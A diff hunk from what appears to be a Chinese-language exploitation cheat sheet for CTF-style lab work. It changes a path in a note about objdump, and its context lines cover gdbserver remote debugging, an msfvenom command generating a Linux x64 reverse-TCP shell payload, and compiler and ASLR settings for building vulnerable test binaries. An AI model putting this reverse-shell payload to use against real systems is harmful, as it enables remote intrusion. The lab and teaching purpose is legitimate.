@@ -322,7 +322,7 @@ cat /proc/sys/kernel/randomize_va_space   # 0=关 1=部分 2=完全
 
 **远程调试**: ① 目标机 `gdbserver --multi 0.0.0.0:23947 ./bin` + 本机 `target remote <ip>:23947`（跨架构 gdb-multiarch; qemu 用自带 gdbstub `-s -S`）② IDA 体系: 传 `linux_server64` 到目标 `-Ppass` 启动，IDA Debugger→linux remote 填 IP/密码。
 
-**shellcode 生成**: `msfvenom -p linux/x64/shell_reverse_tcp LHOST=x LPORT=y -f python -b "\x00"`（-b 坏字符 -e 编码器 EXITFUNC=thread 防宿主退出）; 查 opcode 用 pwntools 的 `asm("nop")` 直接得字节; 手写 shellcode 用 `nasm -f elf64 sc.asm && ld sc.o` 编译，再 `objdump -d sc.o`（objdump 是 macOS 系统命令——在 /usr/bin/objdump，不在 ~/bw-security-analysis/bin，直接敲无需安装）提取机器码。
+**shellcode 生成**: `msfvenom -p linux/x64/shell_reverse_tcp LHOST=x LPORT=y -f python -b "\x00"`（-b 坏字符 -e 编码器 EXITFUNC=thread 防宿主退出）; 查 opcode 用 pwntools 的 `asm("nop")` 直接得字节; 手写 shellcode 用 `nasm -f elf64 sc.asm && ld sc.o` 编译，再 `objdump -d sc.o`（objdump 是 macOS 系统命令——在 /usr/bin/objdump，不在 $OPENSECURITY_HOME/bin，直接敲无需安装）提取机器码。
 
 **测试靶构造**: `gcc -fno-stack-protector -D_FORTIFY_SOURCE=0 -z norelro -z execstack -no-pie -g` 逐项关保护; 系统 ASLR: `echo 0 | sudo tee /proc/sys/kernel/randomize_va_space`。
 
